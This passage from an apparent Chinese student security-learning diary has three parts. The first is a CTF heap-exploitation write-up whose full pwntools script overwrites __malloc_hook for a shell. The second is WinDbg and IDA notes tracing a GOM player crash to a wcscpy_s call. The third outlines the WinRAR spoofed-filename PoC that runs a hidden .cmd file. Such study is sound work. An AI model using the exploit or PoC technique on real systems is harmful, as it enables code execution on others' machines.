title="#7.9"></a>#7.9</h2><p>早上被摇去写了个<code>uaf</code>，然后一直在装<code>FakePDB</code>，救命，装不动了</p><h3 id="pwn题"><a href="#pwn题" class="headerlink" title="pwn题"></a>pwn题</h3><p><code>uaf</code>，限制15个堆，直接<code>tcachebin attack</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-4h]</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">readint</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">></span> <span class="token number">15</span> <span class="token operator">||</span> <span class="token operator">!</span>ptr_list<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"NOOOOOOO!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>ptr_list<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"OKK!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26870</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice >>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'size'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice >>'</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'content'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice >>'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice >>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x500</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.27.so'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3ebca0</span>malloc_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseone <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f2a5</span><span class="token punctuation">,</span> <span class="token number">0x4f302</span><span class="token punctuation">,</span> <span class="token number">0x10a2fc</span><span class="token punctuation">]</span>ogg <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseadd<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x500</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="7-10"><a href="#7-10" class="headerlink" title="#7.10"></a>#7.10</h2><p>安装<code>FakePDB</code>，发现有<code>release</code>版本，唉前一天白浪费那么多时间去编译啦，但是还是只能生成<code>json</code>，<code>pdb</code>还是没生成的起来。然后被老师摇去看论文啦，一万多字的专业性文章真是考验专注力和耐心，过程中和学长交流才发现，其实<code>kb</code>查看栈回溯里的内容就行</p><h3 id="windbg-2"><a href="#windbg-2" class="headerlink" title="windbg"></a>windbg</h3><p>之前对<code>windbg</code>的误区是它既然不能识别函数那不就不能追溯到经过了哪些函数，昨天学到下断点是<code>module_name+address</code>，今天学长提到<code>kb</code>再去看了一下才发现这里的栈回溯就是<code>module_name+address</code>形式的代替了函数</p><p>例如这里的<code>GOM32Q_vc120_ReleaseQC+0x6371de</code>再去看<code>IDA</code>对应的就是<code>0x400000+0x6371de=0xA371DE</code>，即函数<code>_invoke_watson</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">0</span>:00<span class="token operator"><span class="token file-descriptor important">0</span>></span> kb <span class="token punctuation">\</span># ChildEBP RetAddr      Args to Child              WARNING: Stack unwind information not available. Following frames may be wrong.00 017eefc0 00e971cc     00000000 00000000 00000000 GOM32Q_vc120_ReleaseQC+0x6371de01 017eefe4 00a66a63     017ef0ec 00000104 05989178 GOM32Q_vc120_ReleaseQC+0x6371cc02 017ef338 00a4d040     0ada2b98 00000001 00d6723a GOM32Q_vc120_ReleaseQC+0x206a6303 017ef3fc 00d682e2     00ffb640 0ada2b98 00010004 GOM32Q_vc120_ReleaseQC+0x1ed04004 017ef41c 00d6392f     0000c322 0ada2b98 00010004 GOM32Q_vc120_ReleaseQC+0x5082e205 017ef48c 00d640ea     0ad8e898 000408f4 0000c322 GOM32Q_vc120_ReleaseQC+0x50392f06 017ef4ac 771116eb     000408f4 0000c322 0ada2b98 GOM32Q_vc120_ReleaseQC+0x5040ea<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>追溯到最后一个函数如下</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __cdecl __noreturn <span class="token function">_invoke_watson</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token class-name">wchar_t</span> <span class="token operator">*</span>Expression<span class="token punctuation">,</span><span class="token keyword">const</span> <span class="token class-name">wchar_t</span> <span class="token operator">*</span>FunctionName<span class="token punctuation">,</span><span class="token keyword">const</span> <span class="token class-name">wchar_t</span> <span class="token operator">*</span>FileName<span class="token punctuation">,</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> LineNo<span class="token punctuation">,</span><span class="token class-name">uintptr_t</span> Reserved<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">IsProcessorFeaturePresent</span><span class="token punctuation">(</span><span class="token number">0x17u</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token function">__fastfail</span><span class="token punctuation">(</span><span class="token number">5u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">_call_reportfault</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1073740777</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">__crtTerminateProcess</span><span class="token punctuation">(</span><span class="token number">0xC0000417</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="7-11"><a href="#7-11" class="headerlink" title="#7.11"></a>#7.11</h2><p>今天彻底明白怎么用<code>windbg</code>结合<code>IDA</code>调试啦，不容易。对<code>GOM</code>进行了一些逆向，然后又被摇去看论文了嘶，什么时候我能看得懂这个论文在写什么呢（逃</p><h3 id="windbg基础用法"><a href="#windbg基础用法" class="headerlink" title="windbg基础用法"></a>windbg基础用法</h3><h4 id="运行前"><a href="#运行前" class="headerlink" title="运行前"></a>运行前</h4><p>打开文件：<code>文件 -&gt; Launch executable</code></p><p>查看反编译汇编：<code>View -&gt; Layouts -&gt; Disassembly</code></p><p>设置符号路径：<code>.sympath srv*</code></p><p>加载符号：<code>.reload</code></p><h4 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h4><p>运行：<code>g</code></p><p>单步执行不进入函数：<code>p</code></p><p>单步执行进入函数：<code>t</code></p><h4 id="查看-x2F-修改状态"><a href="#查看-x2F-修改状态" class="headerlink" title="查看&#x2F;修改状态"></a>查看&#x2F;修改状态</h4><p>查看堆栈状态：<code>kb</code></p><p>查看寄存器：<code>r</code> &#x2F; <code>r register</code></p><p>修改寄存器：<code>r register = value</code></p><h4 id="查看内存"><a href="#查看内存" class="headerlink" title="查看内存"></a>查看内存</h4><p>查看指定地址反编译代码：<code>u addr</code></p><p>以双字的形式查看内存：</p><p><code>dd addr / register</code></p><pre class="line-numbers language-none"><code class="language-none">0:000&gt; dd 0040000000400000  00405000 00406000 00407000 0040800000400010  00409000 0040A000 0040B000 0040C000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>dc addr / register</code></p><pre class="line-numbers language-none"><code class="language-none">0:000&gt; dc 0040000000400000  00405000 00406000 00407000 00408000  .P...&#96;...p...&#96;...00400010  00409000 0040A000 0040B000 0040C000  ..&#96;...&#96;...&#96;...&#96;...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>以<code>Unicode</code>字符串的形式查看内存：<code>du addr / register</code></p><pre class="line-numbers language-none"><code class="language-none">0:000&gt; du 0040000000400000  &quot;Hello, world!&quot;00400010  &quot;This is a test string.&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>以字节的形式查看内存：<code>db addr / register</code></p><pre class="line-numbers language-none"><code class="language-none">0:000&gt; db 0040000000400000  48 65 6C 6C 6F 2C 20 77-6F 72 6C 64 21 00 00 00  Hello, world!...00400010  54 68 69 73 20 69 73 20-61 20 74 65 73 74 20 73  This is a test s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>以ASCII字符的形式查看内存：<code>da addr / register</code></p><p>以字的形式查看内存：<code>dw addr / register</code></p><p>以十六进制双字的形式查看内存：<code>dD addr / register</code></p><p>以内存内容的指针的形式查看内存：<code>dp addr / register</code></p><h4 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h4><p>查看断点详细情况：<code>bl</code></p><pre class="line-numbers language-none"><code class="language-none">0:000&gt; bl     0 e Disable Clear  00000000 e 1 0001 (0001)  0:****      1 e Disable Clear  00300003     0001 (0001)  0:**** GOM32Q_vc120_ReleaseQC+0x3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>查看断点：<code>.bpcmds</code></p><pre class="line-numbers language-none"><code class="language-none">0:000&gt; .bpcmdsba0 e1 0x00000000 ;bp1 0x00300003 ;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>下断点：</p><p><code>bp</code> ：设置断点，在指定断点位置设置新的断点，如果调试器无法解析断点位置的地址表达式，则自动转换为bu断点，使用bp命令创建在卸载模块时不再处于活动状态的断点</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">0</span>:00<span class="token operator"><span class="token file-descriptor important">0</span>></span> bp MyTest+0xb <span class="token number">7</span> <span class="token comment">#前六次忽略此断点，第七次传递时，执行会停止</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>bm</code>：设置符号断点，命令在与指定模式匹配的符号上设置新的断点。 此命令可以创建多个断点。 默认情况下，匹配模式后，bm断点与bu断点相同。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">0</span>:00<span class="token operator"><span class="token file-descriptor important">0</span>></span> bm myprogram<span class="token operator">!</span>mem*   <span class="token number">4</span>: 0040d070 MyProgram<span class="token operator">!</span>memcpy  <span class="token number">5</span>: 0040c560 MyProgram<span class="token operator">!</span>memmove  <span class="token number">6</span>: 00408960 MyProgram<span class="token operator">!</span>memset<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>bu</code>：设置未解析断点，命令设置延迟或未解析的断点。bu断点是在对命令中指定的断点位置的符号引用上设置的， (不在地址) 上，每当解析具有引用的模块时，就会激活该断点。 </p><h3 id="windbg结合IDA逆向分析"><a href="#windbg结合IDA逆向分析" class="headerlink" title="windbg结合IDA逆向分析"></a>windbg结合IDA逆向分析</h3><h4 id="通过IDA中的地址下断点"><a href="#通过IDA中的地址下断点" class="headerlink" title="通过IDA中的地址下断点"></a>通过IDA中的地址下断点</h4><p>地址偏移 &#x3D; <code>IDA中的地址 - IDA中的基址</code></p><p>查看模块名称&#x2F;地址：<code>lm</code> （基址为<code>start</code>一列</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">0</span>:00<span class="token operator"><span class="token file-descriptor important">0</span>></span> lmstart    end        module name00300000 010f9000   GOM32Q_vc120_ReleaseQC   <span class="token punctuation">(</span>no symbols<span class="token punctuation">)</span>           05990000 05a4c000   swscale_gp_5   <span class="token punctuation">(</span>deferred<span class="token punctuation">)</span>             05a50000 05d69000   avutil_gp_56   <span class="token punctuation">(</span>deferred<span class="token punctuation">)</span>             05d70000 07366000   avcodec_gp_58   <span class="token punctuation">(</span>deferred<span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获取<code>windbg</code>中的地址：<code>模块基址 + 地址偏移</code></p><p>下断点：<code>bu 模块名称 + 地址偏移</code> &#x2F; <code>bu windbg中的地址</code></p><p>例如：<code>IDA</code>中的基址为<code>0x400000</code>，要在<code>IDA</code>中地址为<code>0x500000</code>的位置下断点，则地址偏移为<code>0x500000 - 0x400000 = 0x100000</code>，假设<code>lm</code>查看模块名为<code>test</code>，该模块基址为<code>0x200000</code>，则在<code>windbg</code>中的地址就是<code>0x300000</code>，那么下断点就是<code>du test + 0x100000</code> &#x2F; <code>du 0x300000</code></p><h4 id="通过栈回溯找到IDA中对应函数"><a href="#通过栈回溯找到IDA中对应函数" class="headerlink" title="通过栈回溯找到IDA中对应函数"></a>通过栈回溯找到IDA中对应函数</h4><p>栈回溯查看堆栈情况：<code>kb</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">0</span>:00<span class="token operator"><span class="token file-descriptor important">0</span>></span> kb <span class="token comment"># ChildEBP RetAddr      Args to Child              </span>WARNING: Stack unwind information not available. Following frames may be wrong.00 014fedc0 009371cc     00000000 00000000 00000000 GOM32Q_vc120_ReleaseQC+0x6371de01 014fede4 00506a63     014feeec 00000104 0f4aeea8 GOM32Q_vc120_ReleaseQC+0x6371cc02 014ff138 004ed040     0f4cf948 00000001 0080723a GOM32Q_vc120_ReleaseQC+0x206a6303 014ff1fc 008082e2     00a9b640 0f4cf948 00010004 GOM32Q_vc120_ReleaseQC+0x1ed04004 014ff21c 0080392f     0000c391 0f4cf948 00010004 GOM32Q_vc120_ReleaseQC+0x5082e205 014ff28c 008040ea     0f4cd4c0 00010a66 0000c391 GOM32Q_vc120_ReleaseQC+0x50392f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到形如<code>模块名+地址偏移</code>的栈回溯，要找到在<code>IDA</code>中的对应基址只需要用模块名加上的这个地址偏移（即加号后面部分）再加上<code>IDA</code>基址即可</p><p>例如：<code>GOM32Q_vc120_ReleaseQC+0x6371de</code>，则地址偏移为<code>0x6371de</code>，IDA基址为<code>0x400000</code>，那么在<code>IDA</code>中的地址就是<code>0x6371de + 0x400000 = 0xA371DE</code></p><h3 id="GOM逆向"><a href="#GOM逆向" class="headerlink" title="GOM逆向"></a>GOM逆向</h3><p><code>kb</code>查看栈回溯找到的第一个函数，是触发<code>crash</code>时的反调试</p><p>再往上追溯两个函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">_invalid_parameter</span><span class="token punctuation">(</span><span class="token class-name">wchar_t</span> <span class="token operator">*</span>Expression<span class="token punctuation">,</span><span class="token class-name">wchar_t</span> <span class="token operator">*</span>FunctionName<span class="token punctuation">,</span><span class="token class-name">wchar_t</span> <span class="token operator">*</span>FileName<span class="token punctuation">,</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> LineNo<span class="token punctuation">,</span><span class="token class-name">uintptr_t</span> Reserved<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>v5<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// eax</span>v5 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">DecodePointer</span><span class="token punctuation">(</span>dword_CE8C44<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v5 <span class="token punctuation">)</span>  <span class="token function">_invoke_watson</span><span class="token punctuation">(</span>Expression<span class="token punctuation">,</span> FunctionName<span class="token punctuation">,</span> FileName<span class="token punctuation">,</span> LineNo<span class="token punctuation">,</span> Reserved<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">v5</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __cdecl <span class="token function">_invalid_parameter_noinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">_invalid_parameter</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>再往上追溯一个函数就是漏洞点sub_606910中的sub_5CE090(this[61], v14);，漏洞点就在wcscpy_s(Destination, 0x104u, Source);</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __thiscall <span class="token function">sub_606910</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token operator">*</span>this<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">if</span> <span class="token punctuation">(</span> v12 <span class="token operator">==</span> <span class="token number">116</span> <span class="token punctuation">)</span><span class="token keyword">goto</span> LABEL_25<span class="token punctuation">;</span><span class="token function">sub_44A540</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v12 <span class="token operator">-</span> <span class="token number">116</span> <span class="token operator">+</span> <span class="token number">144</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">LOBYTE</span><span class="token punctuation">(</span>v15<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token function">wcscpy_s</span><span class="token punctuation">(</span>Destination<span class="token punctuation">,</span> <span class="token number">0x104u</span><span class="token punctuation">,</span> Source<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sub_5CE090</span><span class="token punctuation">(</span>this<span class="token punctuation">[</span><span class="token number">61</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v14<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="7-12"><a href="#7-12" class="headerlink" title="#7.12"></a>#7.12</h2><p>早上改说明书摘要，下午和代理沟通，逆向一会和妈妈小姨去逛超市吃海底捞，回去又逆向了一会。唉海底捞真的快吃腻啦</p><h3 id="WinRAR逆向"><a href="#WinRAR逆向" class="headerlink" title="WinRAR逆向"></a>WinRAR逆向</h3><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://paper.seebug.org/3036/#/">https://paper.seebug.org/3036/#/</a></p><p><a href="https://www.cnblogs.com/GoodFish-/p/17715977.html#/">https://www.cnblogs.com/GoodFish-/p/17715977.html#/</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458544969&amp;idx=1&amp;sn=473822d99738dc8c20cf0c7df866adea&amp;chksm=b18d5bc386fad2d597b3b73e9bbd6d243e83e0191527db7cf84f277ac8c455b590956d5da778&amp;scene=27#/">https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458544969&amp;idx=1&amp;sn=473822d99738dc8c20cf0c7df866adea&amp;chksm=b18d5bc386fad2d597b3b73e9bbd6d243e83e0191527db7cf84f277ac8c455b590956d5da778&amp;scene=27#/</a></p><h4 id="实现效果"><a href="#实现效果" class="headerlink" title="实现效果"></a>实现效果</h4><p><code>poc.zip</code>中包含<code>poc.txt</code>和同名的<code>poc.txt</code>文件夹，文件夹中包含一个cmd执行程序名为<code>poc.txt .cmd</code>，用<code>winrar</code>打开<code>poc.zip</code>中的<code>poc.txt</code>文本，<code>poc.txt</code>和<code>poc.txt .cmd</code>都会被释放到临时文件中，而最终打开的是<code>poc.txt .cmd</code>，临时文件目录：<code>C:\Users\Lenovo\AppData\Local\Temp\Rar$DIa30724.35820</code></p><img src="/2024/07/05/2024-shu-qi-xue-xi-ji-lu/%E6%94%BB%E5%87%BB%E6%95%88%E6%9E%9C.png" class><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>用<code>010editor</code>打开<code>poc.zip</code>，需要关注<code>zip</code>结构体中的<code>deFileName</code>，在<code>zip</code>压缩包内，每个文件和文件夹都对应了一个<code>ZIPDIRENTRY</code>数据结构，该数据结构包含一个名为<code>deFileName</code>的成员，用于存储目标文件&#x2F;文件夹的名称</p><img src="/2024/07/05/2024-shu-qi-xue-xi-ji-lu/zip%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.png" class><p>用<code>bindiff</code>比较存在漏洞的版本和更新的版本之间的差异，确定漏洞点位置在&#96;&#96;sub_1400EF508&#96;</p><img src="/2024/07/05/2024-shu-qi-xue-xi-ji-lu/bindiff%E7%BB%93%E6%9E%9C.png" class><h2 id="7-13"><a href="#7-13" class="headerlink" 